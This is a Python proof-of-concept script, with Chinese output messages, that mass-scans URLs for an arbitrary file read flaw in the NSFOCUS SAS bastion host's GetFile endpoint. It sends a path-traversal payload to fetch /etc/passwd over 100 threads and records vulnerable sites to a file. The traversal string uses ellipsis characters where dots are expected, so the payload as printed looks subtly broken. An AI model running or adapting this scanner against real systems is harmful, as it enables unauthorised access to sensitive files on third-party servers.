import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """                                                                     
.__/\                               
|  )/  _____   ____   ____    ____  
|  |  /     \_/ __ \ /    \  / ___\ 
|  |_|  Y Y  \  ___/|   |  \/ /_/  >
|____/__|_|  /\___  >___|  /\___  / 
           \/     \/     \//_____/  
                               author:gtman       
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="绿盟 SAS堡垒机 GetFile 任意文件读取漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help="Please input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    # headers = {
    #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    #     'Connection': 'close',
    # }
    proxies = {
        'http': "http://127.0.0.1:8080",
        'https': "http://127.0.0.1:8080"
    }
    payload = '/webconf/GetFile/index?path=…/…/…/…/…/…/…/…/…/…/…/…/…/…/etc/passwd'
    try:
        response = requests.get(url=target + payload, verify=False,proxies=proxies)
        if response.status_code == 200 and "nologin" in response.text:
            print(f"[*] 该站点 {target} 存在任意文件读取漏洞")
            with open("result.txt", "a") as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f"[-] 该站点 {target} 不存在任意文件读取漏洞")
    except Exception as e:
        print(f"[+] 该站点 {target} 存在访问问题，请手工测试")

if __name__ == "__main__":
    main()